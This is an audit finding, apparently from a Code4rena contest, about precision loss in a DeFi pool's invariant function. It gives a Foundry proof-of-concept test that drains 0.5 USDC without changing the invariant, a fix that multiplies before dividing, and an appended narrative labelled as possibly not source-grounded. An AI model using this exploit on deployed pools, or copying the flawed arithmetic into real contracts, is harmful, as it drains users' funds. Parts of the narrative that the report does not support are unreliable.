---
id: 17988
severity: "High"
---

# Precision loss in the invariant function can lead to loss of funds

## Description

[src/core/Pair.sol#L56](https://github.com/code-423n4/2023-01-numoen/blob/2ad9a73d793ea23a25a381faadc86ae0c8cb5913/src/core/Pair.sol#L56)  

An attacker can steal the funds without affecting the invariant.

## Proof of Concept

We can say the function `Pair.invariant()` is the heart of the protocol.  
All the malicious trades should be prevented by this function.
    
```solidity
Pair.sol
52:   /// @inheritdoc IPair
53:   function invariant(uint256 amount0, uint256 amount1, uint256 liquidity) public view override returns (bool) {
54:     if (liquidity == 0) return (amount0 == 0 && amount1 == 0);
55:
56:     uint256 scale0 = FullMath.mulDiv(amount0, 1e18, liquidity) * token0Scale;//@audit-info precison loss
57:     uint256 scale1 = FullMath.mulDiv(amount1, 1e18, liquidity) * token1Scale;//@audit-info precison loss
58:
59:     if (scale1 > 2 * upperBound) revert InvariantError();
60:
61:     uint256 a = scale0 * 1e18;
62:     uint256 b = scale1 * upperBound;
63:     uint256 c = (scale1 * scale1) / 4;
64:     uint256 d = upperBound * upperBound;
65:
66:     return a + b >= c + d;
67:   }
```

The problem is there is a precision loss in the L56 and L57.  
The precision loss can result in the wrong invariant check result.  
Let’s say the `token0` has 6 decimals and liquidity has more than 24 decimals.  
Then the first `FullMath.mulDiv` will cause significant rounding before it’s converted to D18.  
To clarify the difference I wrote a custom function `invariant()` to see the actual value of `a+b-c-d`.
    
```solidity
function invariant(uint256 amount0, uint256 amount1, uint256 liquidity, uint256 token0Scale, uint256 token1Scale) public view returns (uint256 res) {
  if (liquidity == 0) {
      require (amount0 == 0 && amount1 == 0);
      return 0;
  }

  // uint256 scale0 = FullMath.mulDiv(amount0* token0Scale, 1e18, liquidity) ;
  // uint256 scale1 = FullMath.mulDiv(amount1* token1Scale, 1e18, liquidity) ;
  uint256 scale0 = FullMath.mulDiv(amount0, 1e18, liquidity) * token0Scale;
  uint256 scale1 = FullMath.mulDiv(amount1, 1e18, liquidity) * token1Scale;

  if (scale1 > 2 * upperBound) revert();

  uint256 a = scale0 * 1e18;
  uint256 b = scale1 * upperBound;
  uint256 c = (scale1 * scale1) / 4;
  uint256 d = upperBound * upperBound;

  res = a + b - c - d;
}

function testAudit1() external
{
  uint256 x = 1*10**6;
  uint256 y = 2 * (5 * 10**24 - 10**21);
  uint256 liquidity = 10**24;
  uint256 token0Scale=10**12;
  uint256 token1Scale=1;
  emit log_named_decimal_uint("invariant", invariant(x, y, liquidity, token0Scale, token1Scale), 36);

  x = 1.5*10**6;
  emit log_named_decimal_uint("invariant", invariant(x, y, liquidity, token0Scale, token1Scale), 36);
}
```

Put these two functions in the `LiquidityManagerTest.t.sol` and run the case.  
The result is as below and it shows that while the reserve0 amount changes to 150%, the actual value `a+b-c-d` does not change.
    
    F:\SOL\Code\Code4rena\2023-01-numoen>forge test -vv --match-test testAudit1
    [⠒] Compiling...
    No files changed, compilation skipped
    
    Running 1 test for test/LiquidityManagerTest.t.sol:LiquidityManagerTest
    [PASS] testAudit1() (gas: 10361)
    Logs:
      invariant: 0.000000000000000000000000000000000000
      invariant: 0.000000000000000000000000000000000000
    
    Test result: ok. 1 passed; 0 failed; finished in 5.74ms

So what does this mean? We know that if `a+b-c-d` is positive, it means anyone can call `swap()` to withdraw the excess value.  
The above test shows that the significant change in the token0 reserve amount did not change the value `a+b-c-d`.  
Based on this, I wrote an attack case where dennis pulls 0.5*10**6 token0 without cost while the invariant stays at zero.  
Although the benefit is only 0.5 USDC for this test case, this shows a possibility drawing value without affecting the invariant for pools with low decimals.
    
```solidity
function testAttack() external
{
  // token0 is USDC
  token0Scale = 6;
  token1Scale = 18;

  // cuh adds liquidity
  lendgine = Lendgine(factory.createLendgine(address(token0), address(token1), token0Scale, token1Scale, upperBound));

  uint256 amount0 = 1.5*10**6;
  uint256 amount1 = 2 * (5 * 10**24 - 10**21);
  uint256 liquidity = 10**24;

  token0.mint(cuh, amount0);
  token1.mint(cuh, amount1);

  vm.startPrank(cuh);
  token0.approve(address(liquidityManager), amount0);
  token1.approve(address(liquidityManager), amount1);

  liquidityManager.addLiquidity(
    LiquidityManager.AddLiquidityParams({
      token0: address(token0),
      token1: address(token1),
      token0Exp: token0Scale,
      token1Exp: token1Scale,
      upperBound: upperBound,
      liquidity: liquidity,
      amount0Min: amount0,
      amount1Min: amount1,
      sizeMin: 0,
      recipient: cuh,
      deadline: block.timestamp
    })
  );
  vm.stopPrank();
  showLendgineInfo();

  // dennis starts with zero token
  assertEq(token0.balanceOf(dennis), 0);

  // dennis pulls 0.5 USDC free
  lendgine.swap(
    dennis,
    5*10**5,
    0,
    abi.encode(
      SwapCallbackData({token0: address(token0), token1: address(token1), amount0: 0, amount1: 0, payer: dennis})
    )
  );

  showLendgineInfo();

  // assert
  assertEq(token0.balanceOf(dennis), 5*10**5);
}
```

## Recommendation

Make sure to multiply first before division to prevent precision loss.
    
```solidity
/// @inheritdoc IPair
function invariant(uint256 amount0, uint256 amount1, uint256 liquidity) public view override returns (bool) {
  if (liquidity == 0) return (amount0 == 0 && amount1 == 0);

  uint256 scale0 = FullMath.mulDiv(amount0 * token0Scale, 1e18, liquidity) ;//@audit-info change here
  uint256 scale1 = FullMath.mulDiv(amount1 * token1Scale, 1e18, liquidity) ;//@audit-info change here

  if (scale1 > 2 * upperBound) revert InvariantError();

  uint256 a = scale0 * 1e18;
  uint256 b = scale1 * upperBound;
  uint256 c = (scale1 * scale1) / 4;
  uint256 d = upperBound * upperBound;

  return a + b >= c + d;
}
```

We agree with the issue and implemented the same fix.

## Derived Narrative

The following field is derived content and may not be source-grounded:

The vulnerability is a precision‑loss bug in the core invariant function that validates the balance relationship of a liquidity pool. The function computes two scaled reserve values by first dividing the raw token amounts by the total liquidity and then multiplying by a token‑specific scale factor. Because the division is performed before the multiplication, the intermediate result is rounded down, especially when the token has a low number of decimals (for example six decimals for USDC) and the liquidity amount has many more decimals. This rounding error can make the calculated invariant appear to be satisfied even when the actual reserves have diverged, allowing an attacker to execute a swap that extracts tokens without triggering the invariant check. The exploit works by submitting a trade that increases one reserve while the rounded invariant calculation still returns true, so the contract permits the withdrawal of excess value. The impact is that an attacker can withdraw a non‑zero amount of a low‑decimal token (e.g., 0.5 USDC in the demonstrated test) while the invariant remains zero, effectively stealing funds without any on‑chain error. The condition occurs whenever the pool contains a token with significantly fewer decimals than the liquidity precision, and the invariant function is called during swaps or liquidity updates. Users of the pool, liquidity providers, and the protocol itself are affected because their deposited assets can be silently drained. The issue was discovered during a formal audit when the auditors compared the invariant calculation with a reference implementation and observed that large changes in the reserve of the low‑decimal token did not affect the invariant result. The bug is subtle because the invariant still returns true, so no revert or error is emitted, making it hard to notice without detailed numeric analysis. The proper fix is to rearrange the arithmetic so that the multiplication by the token scale is performed before the division, eliminating the intermediate rounding and preserving full precision. Conceptually, the fix ensures that the invariant check uses exact scaled values rather than approximated ones, restoring the intended accounting guarantees of the protocol. From a user’s perspective the symptom is that a pool may appear balanced in the UI while the actual token balance of the pool decreases, or a participant may receive tokens “for free” after a swap that should have cost nothing, contradicting the expectation that swaps are always balanced by the invariant.
